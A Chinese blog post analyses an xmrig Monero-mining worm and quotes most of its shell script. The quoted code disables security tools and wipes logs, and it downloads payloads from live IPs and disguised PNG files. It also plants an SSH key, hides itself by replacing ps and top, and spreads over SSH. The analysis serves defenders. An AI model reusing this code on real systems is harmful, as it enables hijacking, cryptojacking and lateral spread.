---
title: xmr挖矿脚本分析
date: 2021-11-10 15:23:35
tags: 区块链安全
---

# 门罗币xmrig挖矿病毒分析

起因是队里老师的服务器中招了，不过是在docker里面，阿里云盾的误报。权限给的小，就没去处理。这里分析下这个脚本的逻辑。希望大家再次中招的时候不会这么懵。

这个挖矿脚本明显是通过之前的几个版本的病毒魔改的，还是Redis未授权漏洞。病毒会通过感染主机设置了免密登录的其他主机，并进行Redis数据库未授权访问漏洞的扫描。

因为最近比赛很多，有空再写处置方法。哈哈，鸽鸽。

---

获取当前ip地址信息
sed全局替换(/g)将","替换为"\n"
grep不区分大小写判断是否含有CN

```Bash
if curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep  -i 'CN'; then 
    exit 1 
fi

```



Linux下的安全子系统关闭，并且将错误输出到黑洞

[Selinux](https://baike.baidu.com/item/SELinux/8865268?fr=aladdin)

```Bash
setenforce 0 2>dev/null
echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null

```



清理缓存

```Bash
sync && echo 3 >/proc/sys/vm/dro
```



更改了一些系统命令名称，定义了一些变量

```Bash
crondir='/var/spool/cron/'"$USER"
cont=`cat ${crondir}`
ssht=`cat /root/.ssh/authorized_keys`
echo 1 > /etc/zzhs
rtdir="/etc/zzhs"
bbdir="/usr/bin/curl"
bbdira="/usr/bin/cd1"
ccdir="/usr/bin/wget"
ccdira="/usr/bin/wd1"
mv /usr/bin/curl /usr/bin/url
mv /usr/bin/url /usr/bin/cd1
mv /usr/bin/wget /usr/bin/get
mv /usr/bin/get /usr/bin/wd1
```



修改最大文件限制数

删除日志文件

给目录上锁

关闭防火墙

```Bash
ulimit -n 65535
rm -rf /var/log/syslog
chattr -iua /tmp/
chattr -iua /var/tmp/
ufw disable
iptables -F

```



关闭系统监视

删掉了两个账户

```Bash
#sudo sysctl kernel.nmi_watchdog=0
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
userdel akay
userdel vfinder
rm -rf /tmp/addres*
rm -rf /tmp/walle*
rm -rf /tmp/keys
```



卸载阿里云盾和腾讯的云镜

```Bash
if ps aux | grep -i '[a]liyun'; then
  $bbdir http://update.aegis.aliyun.com/download/uninstall.sh | bash
  $bbdir http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  $bbdira http://update.aegis.aliyun.com/download/uninstall.sh | bash
  $bbdira http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi
```



定义远程文件地址

```Bash
miner_url="http://106.15.74.113/b2f628/zzh"
miner_url_backup="http://104.244.76.33/b2f628/zzh"
miner_size="7600464"
sh_url="https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexni.png"
sh_url_backup="https://guli-edut.oss-cn-shanghai.aliyuncs.com/2020/06/04/indexni.png"
config_url="http://106.15.74.113/b2f628/config.json"
config_url_backup="http://104.244.76.33/b2f628/config.json"
config_size="2752"
chattr_size="8000"
rm -f /tmp/.null 2>/dev/null
echo 128 > /proc/sys/vm/nr_hugepages
sysctl -w vm.nr_hugepages=128
```



删除同类挖矿病毒，很长，省略了些。

需要病毒样本研究的可以从这拿：https://github.com/xiaoyue2019/Xmrig-mining-virus-samples

```Bash

kill_miner_proc()
{
netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
netstat -anp | grep 140.82.52.87 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :23 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :143 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :2222 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3389 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :5555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6666 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6665 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :6667 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :8444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'systemten' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'netns' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'voltuned' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'darwin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/dl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/ddg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/pprt' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/ppol' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/65ccE*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'IOFoqIgyC0zmf2UR' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '45.76.122.92' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.38.191.178' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.15.56.161' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '86s.jpg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aGTSGJJp' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'nMrfmnRa' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'PuNY5tm2' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'I0r8Jyyt' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AgdgACUD' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'uiZvwxG8' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'BtwXn5qH' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '3XEzey2T' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 't2tKrCSZ' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'svc' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'HD7fcBgg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'zXcDajSs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '3lmigMo' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AkMK4A2' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'AJ2AkKe' | awk '{print $2}' | xargs -I % kill -9 %
...

```



杀掉除了zzh之外的占用超过cpu超40%的进程

```Bash
kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "zzh"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "zzh"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}
```



定义下载函数

```Bash
downloads()
{
    if [ -f "/usr/bin/curl" ]
    then 
  echo $1,$2
        http_code=`curl -I -m 50 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            curl --connect-timeout 100 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            curl --connect-timeout 100 --retry 100 $1 > $2
        else
            curl --connect-timeout 100 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/cd1" ]
    then
        http_code=`cd1 -I -m 50 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            cd1 --connect-timeout 100 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            cd1 --connect-timeout 100 --retry 100 $1 > $2
        else
            cd1 --connect-timeout 100 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/wget" ]
    then
        wget --timeout=50 --tries=100 -O $2 $1
        if [ $? -ne 0 ]
  then
    wget --timeout=100 --tries=100 -O $2 $3
        fi
    elif [ -f "/usr/bin/wd1" ]
    then
        wd1 --timeout=100 --tries=100 -O $2 $1
        if [ $? -eq 0 ]
        then
            wd1 --timeout=100 --tries=100 -O $2 $3
        fi
    fi
}
```



[chattr命令简介](https://www.runoob.com/linux/linux-comm-chattr.html)

使用chattr定义上锁解锁函数

-R +ia递归上锁

-R -ia递归解锁

```Bash
unlock_cron()
{
    chattr -R -ia /var/spool/cron
    chattr -ia /etc/crontab
    chattr -R -ia /var/spool/cron/crontabs
    chattr -R -ia /etc/cron.d
}

lock_cron()
{
    chattr -R +ia /var/spool/cron
    chattr +ia /etc/crontab
    chattr -R +ia /var/spool/cron/crontabs
    chattr -R +ia /etc/cron.d
}
```



判断$rtdir是否存在，在上面定义过：

rtdir="/etc/zzhs"

存在就进行，更改了ps和top命令，使用grep -v命令过滤zzh,pnscan

```JavaScript
eg:echo "asasasas" | grep -v "b"
```


```JavaScript
if [ -f "$rtdir" ]
then
        echo "i am root"
        mkdir -p /root/.ssh
        echo "goto 1" >> /etc/zzhs
        chattr -ia /etc/zzh*
        chattr -ia /etc/newinit.sh*
        chattr -ia /root/.ssh/authorized_keys*
        chattr -R -ia /root/.ssh
    if [ -f "/bin/ps.original" ]
    then
        echo "/bin/ps changed"
    else
        mv /bin/ps /bin/ps.original 
        echo "#! /bin/bash">>/bin/ps
        echo "ps.original \$@ | grep -v \"zzh\|pnscan\"">>/bin/ps
        chmod +x /bin/ps
    touch -d 20160825 /bin/ps
        echo "/bin/ps changing"
    fi
    if [ -f "/bin/top.original" ]
    then
        echo "/bin/top changed"
    else
        mv /bin/top /bin/top.original 
        echo "#! /bin/bash">>/bin/top
        echo "top.original \$@ | grep -v \"zzh\|pnscan\"">>/bin/top
        chmod +x /bin/top
    touch -d 20160825 /bin/top
        echo "/bin/top changing"
    fi
    if [ -f "/bin/pstree.original" ]
    then
        echo "/bin/pstree changed"
    else
        mv /bin/pstree /bin/pstree.original 
        echo "#! /bin/bash">>/bin/pstree
        echo "pstree.original \$@ | grep -v \"zzh\|pnscan\"">>/bin/pstree
        chmod +x /bin/pstree
    touch -d 20160825 /bin/pstree
        echo "/bin/pstree changing"
    fi
    if [ -f "/bin/chattr" ]
  then
    chattrsize=`ls -l /bin/chattr | awk '{ print $5 }'`
    if [ "$chattrsize" -lt "$chattr_size" ]
    then
      yum -y remove e2fsprogs
            yum -y install e2fsprogs
    else
      echo "no need install chattr"
    fi
  else
      yum -y remove e2fsprogs
            yum -y install e2fsprogs
```



先解锁，设置挖矿程序任务

```JavaScript
      unlock_cron
                        rm -f ${crondir}
                        rm -f /etc/cron.d/zzh
                        rm -f /etc/crontab
      echo "*/30 * * * * sh /etc/newinit.sh >/dev/null 2>&1" >> ${crondir}
      echo "*/40 * * * * root sh /etc/newinit.sh >/dev/null 2>&1" >> /etc/cron.d/zzh
      echo "0 1 * * * root sh /etc/newinit.sh >/dev/null 2>&1" >> /etc/crontab
                        echo crontab created
      lock_cron
```



设置免密登录，往authorized_keys里面写公钥

```JavaScript
        chmod 700 /root/.ssh/
        echo >> /root/.ssh/authorized_keys
        chmod 600 /root/.ssh/authorized_keys
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver" > /root/.ssh/authorized_keys
        cd1 http://106.15.74.113/b2f628/call.txt
        wget -q -O- http://106.15.74.113/b2f628/call.txt
        cd1 http://106.15.74.113/b2f628/call.txt
        wget -q -O- http://106.15.74.113/b2f628/call.txt
        
  
        file="/etc/zzh"

```



判断zzh存不存在，开始download挖矿程序

```JavaScript
    if [ -f "/etc/zzh" ]
    then
            filesize1=`ls -l /etc/zzh | awk '{ print $5 }'`
            if [ "$filesize1" -ne "$miner_size" ] 
            then
                pkill -f zzh
                rm /etc/zzh
                downloads $miner_url /etc/zzh $miner_url_backup
            else
                echo "not need download"
            fi
    else
            downloads $miner_url /etc/zzh $miner_url_backup
    fi


    downloads $sh_url /etc/indexni.png $sh_url_backup
    cd /etc/;dd if=indexni.png of=newinit.sh skip=17704 bs=1;
```



如果启动脚本时参数不为1就不启动

```JavaScript

    chmod 777 /etc/zzh
    if [ -f "/bin/ps.original" ]
    then
        ps.original -fe|grep zzh |grep -v grep
    else
        ps -fe|grep zzh |grep -v grep
    fi
    if [ $? -ne 0 ]
    then
                cd /etc
                echo "not root runing"
                sleep 5s
                cpunum=`cat /proc/cpuinfo |grep -i model|grep name|wc -l`
```



判断cpu核数启动挖矿程序

```JavaScript
if  (("$cpunum"<=2 )); then
      cpunum=1
      echo $cpunum
elif (("$cpunum"<=4)); then
      cpunum=2
      echo $cpunum
elif (("$cpunum"<=8)); then
      cpunum=4
      echo $cpunum
elif (("$cpunum"<=16)); then
      cpunum=8
      echo $cpunum
elif (("$cpunum"<=32)); then
      cpunum=16
      echo $cpunum
elif (("$cpunum"<=64)); then
      cpunum=32
      echo $cpunum
elif (("$cpunum">64)); then
      cpunum=50
      echo $cpunum
else
      cpunum=1
fi
                ./zzh -B --log-file=/etc/etc --coin=monero -o stratum+tcp://xmr-asia1.nanopool.org:14444 --threads=$cpunum -u 4B1fHgyJ7nJMZPudMrqULw2xoVZfTrinLHJWFJqytnNYTQEVFATKqBnFGSurDPyDCefrHU1QbSCe7A7jDoyKJcUcEaif3Qs.3910 -p x &
    else
                echo "root runing....."
```



开放端口，重启防火墙，清除历史命令

```JavaScript

iptables -F
iptables -X
iptables -A OUTPUT -p tcp --dport 5555 -j DROP
iptables -A OUTPUT -p tcp --dport 7777 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP
service iptables reload
ps auxf|grep -v grep|grep -v 43Xbgtym2GZWBk87XiYbCpTKGPBTxY|grep "stratum"|awk '{print $2}'|xargs kill -9
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history

```



感染设置了免密登录的主机

```JavaScript
yum install -y bash 2>/dev/null
apt install -y bash 2>/dev/null
apt-get install -y bash 2>/dev/null
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o indexis.png https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png || wd1 https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png -O indexis.png;dd if=indexis.png of=is.sh skip=17704 bs=1;cat is.sh | bash >/dev/null 2>&1 &' & done
fi
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'cd1 -o  indexis.png https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png || wget https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png -O indexis.png;dd if=indexis.png of=is.sh skip=17704 bs=1;cat is.sh | bash >/dev/null 2>&1 &' & done
fi
echo "$bbdir"
echo "$bbdira"
```